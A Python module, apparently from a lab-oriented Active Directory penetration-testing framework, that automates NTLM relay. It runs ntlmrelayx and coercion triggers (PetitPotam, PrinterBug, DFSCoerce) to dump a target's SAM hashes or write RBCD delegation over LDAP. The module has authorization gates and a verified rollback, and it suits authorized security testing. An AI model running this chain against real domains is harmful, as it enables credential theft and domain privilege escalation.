"""NTLM-RELAY validation executor -- FULL (T1c-2), listener-based.

Encodes the NTLM-RELAY recipe (claude-mem #66146 C2, recipe-known-not-run) as an
ntlmrelayx listener + coercion-trigger chain on the ADR-001
:class:`ProcessManager` chassis. Two operator-selectable modes:

* ``smb_sam`` (default) -- relay the coerced auth to a signing-off SMB target and
  dump its SAM:
      impacket-ntlmrelayx -t smb://<relay_target> -smb2support -l <lootdir>
  poll for a SAM **loot file** (``<lootdir>/*_samhashes.sam``, via
  :func:`predicates.file_present_nonempty`) -> terminal ``replication_dump``,
  **READ-ONLY** (no AD write, no rollback).

* ``ldap_rbcd`` -- relay to LDAP and write RBCD on the target:
      impacket-ntlmrelayx -t ldap://<relay_target> --delegate-access -smb2support
  poll for the RBCD-write marker -> terminal ``rbcd_access``. This **mutates** AD
  (``mutation.applied = True``), so it performs a VERIFIED rollback (``impacket-rbcd
  -action flush`` + a positive read-back confirming the SD is cleared, reusing the
  RBCD executor's flush+read-verify pattern). Per the ADR-002 review addendum the
  rollback must be VERIFIED or the chain scores ``inconclusive`` -- the scorer's
  ``is_mutating`` fires on the ``rbcd_access`` terminal kind regardless of the
  facet's ``mutating:false``.

Terminal: ``replication_dump`` (smb_sam) or ``rbcd_access`` (ldap_rbcd) -- both are
acceptable for the NTLM-RELAY facet. Only ``action_succeeded`` is positive;
``action_denied`` records a relayed session without a successful action. Failed
coercion, no session, and partial signals retain distinct incomplete outcomes.

``verified_recipe = False`` (recipe-known-not-run, #66146 C2): ships honest
(skipped by ``AutoConfirm`` unless ``include_unverified``), all invocations +
markers UNVERIFIED (flagged below).

Secrets rule: the relayed SAM lives only as a loot FILE on disk; we assert its
PRESENCE (never read its content into the receipt). No hash / SD content reaches
the receipt; the proof token is over public identifiers only.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): NTLM-RELAY keys on
``{host_id}`` (srv02/srv03/dc01/dc02/dc03). ``target_identity`` resolves the
(overridable) ``relay_target`` host through ``config.host_aliases``.

UNVERIFIED ASSUMPTIONS (pin in-lab, mirroring adcs_esc1.py):
* the ntlmrelayx listener invocations (``-t smb://`` + ``-l``; ``-t ldap://`` +
  ``--delegate-access``) and the coercion-trigger invocation;
* the SAM loot filename (``*_samhashes.sam``) and the RBCD-write / flush / empty
  read-back markers. If the real wording/paths differ the chain gets no positive
  artifact/marker and honestly reports not-proved/inconclusive.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from ..predicates import any_present
from .. import proof
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)
from .process_manager import poll_for_capture
from .coercion import COERCION_METHODS, coercion_trigger_argv


RELAY_MODES = ("smb_sam", "ldap_rbcd")
# Class-wide verified_recipe does not prove any individual mode.
MODE_PROVEN = {"smb_sam": False, "ldap_rbcd": False}

# ---- UNVERIFIED output / artifact markers (see module docstring) --------------
_RE_AUTH_LANDED = re.compile(
    r"(Authenticating against (?:ldap|smb)://|SMBD-Thread[^\n]*: (?:Received )?Connection from)",
    re.I)
# Incomplete progress signals cannot establish a relayed session or a negative.
_RE_PARTIAL_SIGNAL = re.compile(
    r"(Authenticating|SMBD-Thread|Dumping SAM|Delegation rights|"
    r"Traceback|Exception|Address already in use)", re.I)
# ntlmrelayx wrote RBCD on the LDAP target (the --delegate-access success line).
_RE_RELAY_RBCD_OK = re.compile(
    r"(Delegation rights (modified|updated)|can now impersonate|"
    r"Enabled delegation to the target|wrote .*AllowedToActOnBehalfOf|"
    r"rbcd.*(written|added))", re.I)
# impacket-rbcd -action flush success marker.
_RE_RBCD_FLUSH_OK = re.compile(
    r"(Delegation rights flushed|rights (modified|updated) successfully)", re.I)
# impacket-rbcd -action read positive header (the read actually returned the SD).
_RE_RBCD_READ_HEADER = re.compile(
    r"(allowed to act on behalf|Accounts allowed to act)", re.I)
# impacket-rbcd -action read: the SD is now empty / cleared (positive confirmation).
_RE_RBCD_EMPTY = re.compile(
    r"(has no entries|no accounts? allowed|is empty|Attribute .* is empty)", re.I)


def _short_name(host: str) -> str:
    return (host or "").split(".", 1)[0]


def _loot_present(lootdir: Path) -> bool:
    """Positive artifact predicate: a non-empty SAM loot file exists in ``lootdir``."""
    try:
        return any_present(str(p) for p in lootdir.glob("*samhashes*"))
    except OSError:
        return False


class NTLMRelayExecutor(ValidationExecutor):
    technique = "NTLM-RELAY"
    technique_class = "relay"
    terminal_kind = "replication_dump"   # smb_sam default; ldap_rbcd -> rbcd_access
    mutating = False                     # smb_sam read-only; ldap_rbcd sets mutation.applied
    verified_recipe = False   # recipe-known-not-run (#66146 C2)
    recipe_ref = ("#66146 C2 NTLM-RELAY = ntlmrelayx listener + coercion -> relay; "
                  "smb_sam: -t smb:// -l <loot> -> SAM dump (replication_dump, read); "
                  "ldap_rbcd: -t ldap:// --delegate-access -> RBCD write (rbcd_access, "
                  "MUTATING -> verified flush rollback) (recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        relay_target = finding.host or ""
        return [
            ParamSpec(
                name="relay_target", kind="target_host",
                description="The signing-off host we relay the coerced auth to "
                            "(smb_sam: SMB SAM dump; ldap_rbcd: the LDAP RBCD "
                            "target). Use its hostname.",
                recommended=relay_target,
                rationale="The host of the aranum relay-candidate finding (#66142).",
            ),
            ParamSpec(
                name="mode", kind="free",
                description="Relay mode: 'smb_sam' (relay->SMB, dump SAM, read-only) "
                            "or 'ldap_rbcd' (relay->LDAP, write RBCD, mutating).",
                recommended="smb_sam",
                rationale="SMB SAM dump is the read-only default; ldap_rbcd writes "
                          "RBCD and carries a verified rollback (ADR-001 D3).",
                choices=list(RELAY_MODES),
            ),
            ParamSpec(
                name="victim_dc", kind="target_host",
                description="The host to coerce so its auth is relayed. Defaults to "
                            "the relay target (self-relay), override to another "
                            "coercible host.",
                recommended=relay_target,
                rationale="The coerced principal that feeds the relay listener.",
            ),
            ParamSpec(
                name="listener_host", kind="target_host",
                description="Host our ntlmrelayx listener binds / the coercion points "
                            "back at. Empty = framework-managed on the local interface.",
                recommended="",
                rationale="Framework-managed by default; override for an operator-run "
                          "relay box (ADR-001 Decision 2).",
                required=False,
            ),
            ParamSpec(
                name="method", kind="free",
                description="Coercion vector feeding the relay (auto/petitpotam/"
                            "printerbug/dfscoerce).",
                recommended="auto",
                rationale="Coercer multiplexer by default (research 3.3).",
                choices=list(COERCION_METHODS),
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # NTLM-RELAY facet keys on {host_id}: resolve the (overridable) relay target.
        relay_target = (params["relay_target"].value if "relay_target" in params else None) \
            or finding.host or ""
        return ctx.config.resolve_target_identity(relay_target)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        mode = v.get("mode") or "smb_sam"
        listener = v.get("listener_host") or "<local>"
        relay = v["relay_target"]
        if mode == "ldap_rbcd":
            return [
                f"start ntlmrelayx -t ldap://{relay} --delegate-access on {listener}",
                f"coerce ({v['method']}) {v['victim_dc']} -> {listener}",
                "poll listener for the RBCD-write marker (rbcd_access)",
                f"ROLLBACK (MUTATING): impacket-rbcd -delegate-to {_short_name(relay)}$ "
                "-action flush ; read-back confirms SD cleared",
            ]
        return [
            f"start ntlmrelayx -t smb://{relay} -l <lootdir> on {listener}",
            f"coerce ({v['method']}) {v['victim_dc']} -> {listener}",
            "poll <lootdir> for *_samhashes.sam (replication_dump; read-only, no rollback)",
            "stop listener",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self, cfg) -> tuple[str, list[str]]:
        """Operator's own auth for the rollback: (``domain/user[:pass]``, hash flags)."""
        target = f"{cfg.domain}/{cfg.username or ''}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        relay_target = v["relay_target"]
        mode = v.get("mode") or "smb_sam"
        victim_dc = v.get("victim_dc") or relay_target
        listener_host = v.get("listener_host") or ""
        method = v.get("method") or "auto"
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        lootdir = out_dir / "loot"

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode if res else None, note=note))

        # Gate the active relay op (ldap_rbcd additionally mutates; gated once).
        verdict = ctx.authorizer.authorize(
            "relay", {"relay_target": relay_target, "mode": mode})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "relay"
            errors.append("gate_denied:relay")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "relay"

        # 1) start the ntlmrelayx listener (non-blocking). UNVERIFIED invocation.
        if mode == "ldap_rbcd":
            listener_argv = ["impacket-ntlmrelayx", "-t", f"ldap://{relay_target}",
                             "--delegate-access", "-smb2support",
                             "--no-http-server", "--no-wcf-server", "--no-raw-server",
                             "--no-rpc-server", "--no-winrm-server", "--no-mssql-server",
                             "--no-rdp-server"]
        else:
            lootdir.mkdir(parents=True, exist_ok=True)
            listener_argv = ["impacket-ntlmrelayx", "-t", f"smb://{relay_target}",
                             "-smb2support", "-l", str(lootdir),
                             "--no-http-server", "--no-wcf-server", "--no-raw-server",
                             "--no-rpc-server", "--no-winrm-server", "--no-mssql-server",
                             "--no-rdp-server"]
        try:
            handle = ctx.proc_manager.start(listener_argv, cwd=str(out_dir))
        except OSError as exc:
            record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
            errors.append("listener_start_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        record("start_listener", listener_argv, None, True,
               note=f"{mode} listener on {listener_host or '<local>'}")

        # 2) fire the coercion trigger (synchronous) to feed the listener.
        try:
            trig_argv = coercion_trigger_argv(method, victim_dc, listener_host or ctx.config.dc_ip, cfg)
            res = ctx.runner.run(trig_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
            fired = not (res.timed_out or res.error)
            record("coerce_trigger", trig_argv, res, fired,
                   note=f"method={method}" + ("" if fired else " (trigger did not run)"))

            # 3) poll for the mode-specific success (loot artifact / RBCD marker).
            if mode == "ldap_rbcd":
                success = lambda out: bool(_RE_RELAY_RBCD_OK.search(out))
            else:
                success = lambda _out: _loot_present(lootdir)
            output, captured = poll_for_capture(
                ctx.proc_manager, handle, success=success,
                interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
        finally:
            final_out = ctx.proc_manager.stop(handle)

        output = output + "\n" + final_out  # runtime only; never serialized
        captured = captured or (bool(_RE_RELAY_RBCD_OK.search(output))
                                if mode == "ldap_rbcd" else _loot_present(lootdir))
        if not fired:
            classification = "coerce_not_fired"
        elif captured:
            classification = "action_succeeded"
        elif _RE_AUTH_LANDED.search(output):
            classification = "action_denied"
        elif _RE_PARTIAL_SIGNAL.search(output):
            classification = "inconclusive"
        else:
            classification = "no_auth_landed"
        if classification != "action_succeeded":
            errors.append(classification)

        if mode == "ldap_rbcd":
            return self._finish_ldap_rbcd(ctx, cfg, v, relay_target, captured,
                                          steps, errors, gate, mutation, record,
                                          classification)

        # smb_sam: the SAM loot file is the proof (read-only, no rollback).
        record("sam_loot", listener_argv, RunResult(returncode=None), captured,
               note="SAM loot file present" if captured else "no SAM loot captured")
        terminal_fact = self._terminal_fact(cfg, relay_target, mode, classification)
        return self._artifact(steps, gate, mutation, terminal_fact,
                              classification == "action_succeeded", errors)

    @staticmethod
    def _terminal_fact(cfg, relay_target, mode, classification):
        # Only public identifiers and fixed outcome strings enter the proof.
        predicates = {
            "coerce_not_fired": "coercion trigger timed out or failed to run",
            "no_auth_landed": "no relayed session observed within the poll window (inconclusive)",
            "action_denied": "relayed session observed but the requested action did not succeed",
            "action_succeeded": "RBCD write observed" if mode == "ldap_rbcd"
                                else "SAM loot file present (read-only)",
            "inconclusive": "partial listener signal without a confirmed outcome (inconclusive)",
        }
        return proof.build_terminal_fact(
            "rbcd_access" if mode == "ldap_rbcd" else "replication_dump",
            ok=classification == "action_succeeded",
            predicate=predicates[classification],
            proof_token=proof.proof_token("NTLM-RELAY", cfg.domain, relay_target,
                                          mode, classification),
            extra={"mode": mode, "mode_proven": MODE_PROVEN[mode],
                   "relay_target": _short_name(relay_target),
                   "classification": classification})

    # ------------------------------------------------- ldap_rbcd finish + rollback
    def _finish_ldap_rbcd(self, ctx, cfg, v, relay_target, captured,
                          steps, errors, gate, mutation, record, classification) -> dict:
        record("relay_rbcd_write", ["impacket-ntlmrelayx", "--delegate-access"],
               RunResult(returncode=None), captured,
               note="RBCD written via relay" if captured else "no RBCD write captured")
        if not captured:
            terminal_fact = self._terminal_fact(cfg, relay_target, "ldap_rbcd", classification)
            return self._artifact(steps, gate, mutation, terminal_fact, False, errors)

        # The relay WROTE RBCD on the target -> AD mutated -> verified rollback.
        mutation["applied"] = True
        vsam = _short_name(relay_target)
        dc = cfg.dc_ip
        op_target, op_extra = self._op_auth_target(cfg)
        if ctx.authorizer.authorize("rollback", {"delegate_to": f"{vsam}$"}) == "denied":
            errors.append("gate_denied:rollback")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "ntlmrelayx RBCD via relay; rbcd -action flush + read-back verify"

        flush_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$", "-action", "flush",
                      "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(flush_argv, timeout=cfg.tool_timeout_s)
        flush_ok = bool(_RE_RBCD_FLUSH_OK.search(res.stdout or ""))
        record("rollback_rbcd_flush", flush_argv, res, flush_ok)

        read_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$", "-action", "read",
                     "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s)
        read_out = res.stdout or ""
        # Positive confirmation the SD is cleared: the read SUCCEEDED (header marker)
        # AND reports an empty SD. A transport-failed/empty read must not pass
        # vacuously (ADR-002 D3 / review addendum).
        cleared = bool(_RE_RBCD_READ_HEADER.search(read_out)) and bool(_RE_RBCD_EMPTY.search(read_out))
        record("rollback_verify_read", read_argv, res, cleared,
               note="SD cleared" if cleared else "SD not confirmed cleared")

        mutation["rollback"]["verified"] = bool(flush_ok and cleared)
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

        terminal_fact = self._terminal_fact(cfg, relay_target, "ldap_rbcd", classification)
        # Complete = relay wrote RBCD AND the rollback was performed (its verification
        # is scored by the rollback guard, not a completeness condition).
        complete = mutation["rollback"]["performed"] and classification == "action_succeeded"
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
